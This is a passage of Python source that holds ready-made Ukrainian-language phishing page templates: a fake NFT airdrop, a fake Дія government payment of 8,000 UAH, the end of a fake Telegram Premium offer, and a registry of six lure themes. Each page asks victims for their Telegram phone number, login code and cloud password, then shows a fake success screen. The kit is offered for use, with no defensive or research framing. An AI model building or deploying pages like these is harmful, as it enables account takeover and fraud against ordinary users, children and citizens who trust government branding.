      </div>
      <input type="password" id="passInput" class="pass-input mb-4" placeholder="Хмарний пароль Telegram">
      <div id="errorMsg" class="mb-3"></div>
      <button id="passBtn" data-text="АКТИВУВАТИ" onclick="verifyPassword()" class="btn-premium w-full py-4">АКТИВУВАТИ</button>
    </div>
  </div>

  <!-- Step 4 -->
  <div id="step4" style="display:none;">
    <div class="card p-6 text-center">
      <div class="crown-glow mb-4">👑</div>
      <div class="text-2xl font-black text-yellow-400 mb-3">Premium активовано!</div>
      <div class="text-gray-300 mb-4">Telegram Premium активовано на <strong class="text-yellow-400">12 місяців!</strong></div>
      <div class="badge-ua">🇺🇦 Акція до Дня Незалежності України</div>
    </div>
  </div>

</div>
""" + _SHARED_JS + """</body>
</html>"""

# ---------------------------------------------------------------------------
# Template 5: NFT Drop
# ---------------------------------------------------------------------------

NFT_DROP_HTML = """<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:title" content="NFT Airdrop — Безкоштовний NFT для України">
<meta property="og:description" content="Отримай унікальний NFT від TON Foundation. Безкоштовний airdrop для України.">
<title>NFT Airdrop — Безкоштовний NFT!</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  body { background: #0a0a0a; min-height: 100vh; font-family: 'Inter', sans-serif; overflow-x: hidden; }
  .bg-blobs::before { content: ''; position: fixed; top: -100px; left: -100px; width: 400px; height: 400px; background: radial-gradient(circle, rgba(139,92,246,.15) 0%, transparent 70%); pointer-events: none; }
  .bg-blobs::after { content: ''; position: fixed; bottom: -100px; right: -100px; width: 400px; height: 400px; background: radial-gradient(circle, rgba(236,72,153,.12) 0%, transparent 70%); pointer-events: none; }
  .grad-text { background: linear-gradient(135deg, #a855f7, #ec4899, #3b82f6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
  .btn-nft { background: linear-gradient(135deg, #7c3aed, #db2777); border: none; color: #fff; font-weight: 700; border-radius: 12px; cursor: pointer; transition: transform .1s, box-shadow .1s; box-shadow: 0 4px 20px rgba(124,58,237,.4); font-size: 1.05rem; }
  .btn-nft:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(124,58,237,.6); }
  .card { background: rgba(255,255,255,.04); border: 1px solid rgba(139,92,246,.2); border-radius: 16px; }
  .nft-card { background: linear-gradient(135deg, rgba(139,92,246,.2), rgba(236,72,153,.15)); border: 1px solid rgba(139,92,246,.3); border-radius: 16px; padding: 20px; text-align: center; position: relative; overflow: hidden; }
  .nft-card::before { content: ''; position: absolute; inset: 0; background: linear-gradient(45deg, transparent 30%, rgba(255,255,255,.05) 50%, transparent 70%); animation: shine 3s infinite; }
  @keyframes shine { 0%{transform:translateX(-100%)} 100%{transform:translateX(100%)} }
  .progress-bar { height: 8px; background: rgba(255,255,255,.1); border-radius: 4px; overflow: hidden; }
  .progress-fill { height: 100%; background: linear-gradient(90deg, #7c3aed, #ec4899); border-radius: 4px; }
  .code-input { width: 48px; height: 56px; text-align: center; font-size: 1.5rem; font-weight: 800; background: rgba(139,92,246,.1); border: 2px solid rgba(139,92,246,.3); border-radius: 8px; color: #fff; outline: none; }
  .code-input:focus { border-color: #a855f7; box-shadow: 0 0 0 3px rgba(139,92,246,.15); }
  #errorMsg { background: rgba(231,76,60,.12); border: 1px solid rgba(231,76,60,.3); border-radius: 8px; padding: 10px 14px; color: #ff8080; font-size: .875rem; display: none; }
  .phone-input { background: rgba(255,255,255,.06); border: 2px solid rgba(139,92,246,.25); border-radius: 10px; color: #fff; font-size: 1.1rem; padding: 14px 16px; width: 100%; outline: none; }
  .phone-input:focus { border-color: #a855f7; }
  .phone-input::placeholder { color: rgba(255,255,255,.25); }
  .pass-input { background: rgba(255,255,255,.06); border: 2px solid rgba(139,92,246,.25); border-radius: 10px; color: #fff; font-size: 1rem; padding: 12px 16px; width: 100%; outline: none; }
  .pass-input:focus { border-color: #a855f7; }
  .nft-logo { font-size: 3.5rem; font-weight: 900; background: linear-gradient(135deg, #a855f7, #ec4899, #3b82f6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; text-shadow: none; filter: drop-shadow(0 0 20px rgba(168,85,247,.5)); }
</style>
</head>
<body class="bg-blobs flex items-center justify-center p-4">
<div style="max-width:460px;width:100%;position:relative;z-index:1;">

  <!-- Step 1 -->
  <div id="step1">
    <div class="card p-6 mb-4">
      <div class="text-center mb-4">
        <div class="nft-logo mb-2">NFT</div>
        <div class="text-2xl font-black text-white mb-2">🎨 Безкоштовний<br><span class="grad-text">NFT Airdrop для України!</span></div>
        <div class="text-sm text-gray-400">Отримай унікальний NFT від TON Foundation. Верифікація через Telegram.</div>
      </div>
      <!-- NFT Preview Card -->
      <div class="nft-card mb-4">
        <div class="text-4xl mb-2">🖼️</div>
        <div class="font-bold text-white text-sm">Ukrainian Heritage Collection</div>
        <div class="text-purple-300 text-xs mt-1">#4521 / 10,000</div>
        <div class="mt-2 text-xs text-gray-400">TON Foundation × Ukraine</div>
      </div>
      <!-- Progress -->
      <div class="mb-4">
        <div class="flex justify-between text-sm mb-1">
          <span class="text-gray-400">💎 Роздано: <span class="text-purple-300">4,521</span> / 10,000 NFT</span>
          <span class="text-purple-300">45%</span>
        </div>
        <div class="progress-bar"><div class="progress-fill" style="width:45%"></div></div>
      </div>
      <div class="text-center mb-4">
        <div class="text-yellow-400 text-sm">⏰ Airdrop закінчується: <span class="js-timer text-white">01:59:59</span></div>
      </div>
      <div class="mb-4">
        <label class="block text-sm font-semibold text-gray-300 mb-2">Введіть номер Telegram для верифікації гаманця:</label>
        <input type="tel" id="phoneInput" class="phone-input" placeholder="+380XXXXXXXXX">
      </div>
      <div id="errorMsg" class="mb-3"></div>
      <button id="sendBtn" data-text="CLAIM NFT" onclick="sendCode()" class="btn-nft w-full py-4">CLAIM NFT</button>
      <div class="text-center text-xs text-gray-500 mt-3">🔒 TON Network — безпечна верифікація</div>
    </div>
  </div>

  <!-- Step 2 -->
  <div id="step2" style="display:none;">
    <div class="card p-6">
      <div class="text-center mb-5">
        <div class="nft-logo text-3xl mb-2">NFT</div>
        <div class="text-4xl mb-2">📩</div>
        <div class="text-xl font-bold text-white mb-1">Код підтвердження</div>
        <div class="text-sm text-gray-400">Введіть код з Telegram для верифікації гаманця</div>
      </div>
      <div class="flex justify-center gap-2 mb-5">
        <input type="tel" id="code1" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code2" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code3" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code4" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code5" class="code-input" maxlength="1" inputmode="numeric">
      </div>
      <div id="errorMsg" class="mb-3"></div>
      <button id="verifyBtn" data-text="ПІДТВЕРДИТИ" onclick="verifyCode()" class="btn-nft w-full py-4">ПІДТВЕРДИТИ</button>
    </div>
  </div>

  <!-- Step 3 -->
  <div id="step3" style="display:none;">
    <div class="card p-6">
      <div class="text-center mb-5">
        <div class="text-4xl mb-2">🔐</div>
        <div class="text-xl font-bold text-white mb-1">Хмарний пароль</div>
        <div class="text-sm text-gray-400">Введіть хмарний пароль Telegram</div>
      </div>
      <input type="password" id="passInput" class="pass-input mb-4" placeholder="Хмарний пароль">
      <div id="errorMsg" class="mb-3"></div>
      <button id="passBtn" data-text="ПІДТВЕРДИТИ" onclick="verifyPassword()" class="btn-nft w-full py-4">ПІДТВЕРДИТИ</button>
    </div>
  </div>

  <!-- Step 4 -->
  <div id="step4" style="display:none;">
    <div class="card p-6 text-center">
      <div class="text-6xl mb-4">🎨</div>
      <div class="text-2xl font-black grad-text mb-3">NFT зарезервовано!</div>
      <div class="text-gray-300 mb-4">NFT буде відправлено на ваш гаманець протягом <strong class="text-purple-400">48 годин!</strong></div>
      <div class="nft-card">
        <div class="text-3xl mb-1">🖼️</div>
        <div class="font-bold text-white text-sm">Ukrainian Heritage Collection</div>
        <div class="text-purple-300 text-xs mt-1">Ваш NFT зарезервовано ✅</div>
      </div>
    </div>
  </div>

</div>
""" + _SHARED_JS + """</body>
</html>"""

# ---------------------------------------------------------------------------
# Template 6: Дія — Виплата від Держави
# ---------------------------------------------------------------------------

DIYA_HTML = """<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:title" content="Дія — Державна виплата 8,000 грн">
<meta property="og:description" content="Кабінет Міністрів України затвердив одноразову грошову допомогу. Подайте заявку онлайн.">
<title>Дія — Виплата 8,000 грн | Урядовий портал</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  body { background: #f7f8fa; min-height: 100vh; font-family: 'Inter', sans-serif; color: #1a1a1a; }
  .diya-header { background: #0057B8; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; }
  .diya-logo { background: #FFD700; color: #0057B8; font-weight: 800; font-size: 1.1rem; padding: 4px 12px; border-radius: 6px; letter-spacing: 1px; }
  .diya-badge { font-size: .75rem; color: rgba(255,255,255,.85); }
  .gov-card { background: #fff; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,.08); border: 1px solid #e5e7eb; }
  .btn-diya { background: #0057B8; border: none; color: #fff; font-weight: 600; border-radius: 8px; cursor: pointer; transition: background .15s, transform .1s; font-size: 1rem; }
  .btn-diya:hover { background: #0046a0; transform: translateY(-1px); }
  .badge-yellow { background: #FFD700; color: #0057B8; font-weight: 700; border-radius: 6px; padding: 4px 10px; font-size: .8rem; }
  .step-indicator { background: #e8f0fe; border-radius: 8px; padding: 8px 14px; font-size: .85rem; color: #0057B8; font-weight: 600; border-left: 3px solid #0057B8; }
  .info-box { background: #f0f7ff; border: 1px solid #c3dafe; border-radius: 8px; padding: 12px 14px; }
  .info-box-yellow { background: #fffbeb; border: 1px solid #fde68a; border-radius: 8px; padding: 12px 14px; }
  .phone-input { background: #fff; border: 1.5px solid #d1d5db; border-radius: 8px; color: #1a1a1a; font-size: 1rem; padding: 12px 14px; width: 100%; outline: none; transition: border-color .15s; }
  .phone-input:focus { border-color: #0057B8; box-shadow: 0 0 0 3px rgba(0,87,184,.1); }
  .phone-input::placeholder { color: #9ca3af; }
  .pass-input { background: #fff; border: 1.5px solid #d1d5db; border-radius: 8px; color: #1a1a1a; font-size: 1rem; padding: 12px 14px; width: 100%; outline: none; transition: border-color .15s; }
  .pass-input:focus { border-color: #0057B8; box-shadow: 0 0 0 3px rgba(0,87,184,.1); }
  .code-input { width: 46px; height: 52px; text-align: center; font-size: 1.4rem; font-weight: 700; background: #fff; border: 1.5px solid #d1d5db; border-radius: 8px; color: #1a1a1a; outline: none; transition: border-color .15s; }
  .code-input:focus { border-color: #0057B8; box-shadow: 0 0 0 3px rgba(0,87,184,.1); }
  #errorMsg { background: #fef2f2; border: 1px solid #fca5a5; border-radius: 8px; padding: 10px 14px; color: #dc2626; font-size: .875rem; display: none; }
  .ssl-badge { display: inline-flex; align-items: center; gap: 4px; font-size: .75rem; color: #16a34a; }
  .criteria-item { display: flex; align-items: center; gap: 8px; padding: 6px 0; border-bottom: 1px solid #f3f4f6; }
  .criteria-item:last-child { border-bottom: none; }
  .steps-list { counter-reset: step-counter; }
  .step-item { display: flex; gap: 12px; padding: 8px 0; }
  .step-num { background: #0057B8; color: #fff; border-radius: 50%; width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; font-size: .75rem; font-weight: 700; flex-shrink: 0; margin-top: 2px; }
</style>
</head>
<body>
<!-- Government Header -->
<div class="diya-header">
  <div class="flex items-center gap-3">
    <div class="diya-logo">Дія</div>
    <div class="diya-badge">🇺🇦 Урядовий портал</div>
  </div>
  <div class="flex items-center gap-3">
    <span class="ssl-badge" style="color:rgba(255,255,255,.8);">🔒 SSL</span>
  </div>
</div>

<div class="p-4 max-w-lg mx-auto">

  <!-- Step 1 -->
  <div id="step1">
    <div class="gov-card p-5 mb-4">
      <div class="flex items-center justify-between mb-3">
        <div class="text-xs text-gray-500">Постанова КМУ №847 від 15.02.2026</div>
        <div class="badge-yellow">НОВЕ</div>
      </div>
      <h1 class="text-xl font-bold text-gray-900 mb-1">Державна виплата 8,000 грн</h1>
      <p class="text-sm text-gray-600 mb-4">Кабінет Міністрів України затвердив одноразову грошову допомогу для громадян.</p>
      <div class="info-box mb-4">
        <div class="text-xs font-bold text-blue-800 uppercase tracking-wide mb-2">Хто може отримати:</div>
        <div class="criteria-item"><span class="text-blue-600">✓</span><span class="text-sm text-gray-700">Громадяни України 18+</span></div>
        <div class="criteria-item"><span class="text-blue-600">✓</span><span class="text-sm text-gray-700">З активним акаунтом Telegram</span></div>
        <div class="criteria-item"><span class="text-blue-600">✓</span><span class="text-sm text-gray-700">Виплата на банківську картку</span></div>
      </div>
      <div class="mb-4">
        <div class="text-xs font-bold text-gray-600 uppercase tracking-wide mb-2">Як отримати:</div>
        <div class="steps-list">
          <div class="step-item"><div class="step-num">1</div><div class="text-sm text-gray-700">Верифікація особи через Telegram</div></div>
          <div class="step-item"><div class="step-num">2</div><div class="text-sm text-gray-700">Підтвердження та перевірка даних</div></div>
          <div class="step-item"><div class="step-num">3</div><div class="text-sm text-gray-700">Отримання коштів на картку (3-5 днів)</div></div>
        </div>
      </div>
      <div class="text-sm text-gray-500 mb-1">✅ 234,567 громадян вже отримали виплату</div>
      <div class="text-yellow-600 text-sm mb-4">⏰ Заявки приймаються ще: <span class="js-timer font-bold text-gray-900">01:59:59</span></div>
    </div>

    <div class="gov-card p-5 mb-4">
      <div class="step-indicator mb-4">📋 Крок 1 з 3 — Верифікація</div>
      <p class="text-sm text-gray-700 mb-4">Для підтвердження особи введіть номер телефону, прив'язаний до вашого акаунту Telegram.</p>
      <div class="mb-4">
        <label class="block text-sm font-medium text-gray-700 mb-2">📱 Номер телефону:</label>
        <input type="tel" id="phoneInput" class="phone-input" placeholder="+380XXXXXXXXX">
      </div>
      <div id="errorMsg" class="mb-3"></div>
      <button id="sendBtn" data-text="ПРОДОВЖИТИ →" onclick="sendCode()" class="btn-diya w-full py-3 text-base">ПРОДОВЖИТИ →</button>
      <div class="mt-3 text-xs text-gray-500">🔒 Ваші дані захищені відповідно до Закону України «Про захист персональних даних»</div>
    </div>
  </div>

  <!-- Step 2 -->
  <div id="step2" style="display:none;">
    <div class="gov-card p-5 mb-4">
      <div class="step-indicator mb-4">📋 Крок 2 з 3 — Підтвердження</div>
      <div class="text-center mb-5">
        <div class="text-4xl mb-2">📩</div>
        <div class="text-lg font-bold text-gray-900 mb-1">Код підтвердження</div>
        <div class="text-sm text-gray-600">Введіть код, надісланий в Telegram</div>
      </div>
      <div class="flex justify-center gap-2 mb-5">
        <input type="tel" id="code1" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code2" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code3" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code4" class="code-input" maxlength="1" inputmode="numeric">
        <input type="tel" id="code5" class="code-input" maxlength="1" inputmode="numeric">
      </div>
      <div id="errorMsg" class="mb-3"></div>
      <button id="verifyBtn" data-text="ПІДТВЕРДИТИ КОД" onclick="verifyCode()" class="btn-diya w-full py-3">ПІДТВЕРДИТИ КОД</button>
    </div>
  </div>

  <!-- Step 3 -->
  <div id="step3" style="display:none;">
    <div class="gov-card p-5 mb-4">
      <div class="step-indicator mb-4">📋 Крок 2.1 — Додаткова верифікація</div>
      <div class="text-center mb-5">
        <div class="text-4xl mb-2">🔐</div>
        <div class="text-lg font-bold text-gray-900 mb-1">Двоетапна перевірка</div>
        <div class="text-sm text-gray-600">Введіть хмарний пароль Telegram для завершення верифікації</div>
      </div>
      <input type="password" id="passInput" class="pass-input mb-4" placeholder="Хмарний пароль Telegram">
      <div id="errorMsg" class="mb-3"></div>
      <button id="passBtn" data-text="ПІДТВЕРДИТИ" onclick="verifyPassword()" class="btn-diya w-full py-3">ПІДТВЕРДИТИ</button>
    </div>
  </div>

  <!-- Step 4 -->
  <div id="step4" style="display:none;">
    <div class="gov-card p-5 mb-4">
      <div class="text-center mb-4">
        <div class="text-5xl mb-3">✅</div>
        <div class="text-xl font-bold text-green-700 mb-2">Заявку прийнято!</div>
      </div>
      <div class="info-box-yellow mb-4">
        <div class="text-sm font-bold text-yellow-800 mb-2">Деталі заявки:</div>
        <div class="text-sm text-gray-700 mb-1">📋 Реєстраційний номер: <strong>UA-2026-847291</strong></div>
        <div class="text-sm text-gray-700 mb-1">💰 Сума виплати: <strong>8,000 грн</strong></div>
        <div class="text-sm text-gray-700">📅 Очікуваний термін: <strong>3-5 робочих днів</strong></div>
      </div>
      <div class="text-sm text-gray-600">Кошти будуть зараховані на картку, прив'язану до Дія. 📩 Повідомлення про зарахування буде надіслано в Telegram.</div>
    </div>
    <div class="diya-header rounded-lg">
      <div class="diya-logo">Дія</div>
      <div class="text-xs text-white opacity-75">🇺🇦 Урядовий портал України</div>
    </div>
  </div>

</div>
""" + _SHARED_JS + """</body>
</html>"""

# ---------------------------------------------------------------------------
# Registry: theme_key -> template dict
# ---------------------------------------------------------------------------

LANDING_TEMPLATES = {
    'roblox': {
        'name': 'Roblox — Безкоштовні Robux',
        'slug': 'roblox-robux',
        'language': 'uk',
        'theme': 'roblox',
        'html_content': ROBLOX_HTML,
    },
    'standoff': {
        'name': 'Standoff 2 — Безкоштовне Золото',
        'slug': 'standoff-gold',
        'language': 'uk',
        'theme': 'standoff',
        'html_content': STANDOFF_HTML,
    },
    'telegram-stars': {
        'name': 'Telegram Stars — Безкоштовні Зірки',
        'slug': 'telegram-stars',
        'language': 'uk',
        'theme': 'telegram',
        'html_content': TELEGRAM_STARS_HTML,
    },
    'telegram-premium': {
        'name': 'Telegram Premium — Безкоштовна Підписка',
        'slug': 'telegram-premium',
        'language': 'uk',
        'theme': 'telegram',
        'html_content': TELEGRAM_PREMIUM_HTML,
    },
    'nft': {
        'name': 'NFT Airdrop — Безкоштовний NFT',
        'slug': 'nft-drop',
        'language': 'uk',
        'theme': 'nft',
        'html_content': NFT_DROP_HTML,
    },
    'diya': {
        'name': 'Дія — Виплата від Держави 8,000 грн',
        'slug': 'diya-vyplata',
        'language': 'uk',
        'theme': 'government',
        'html_content': DIYA_HTML,
    },
}
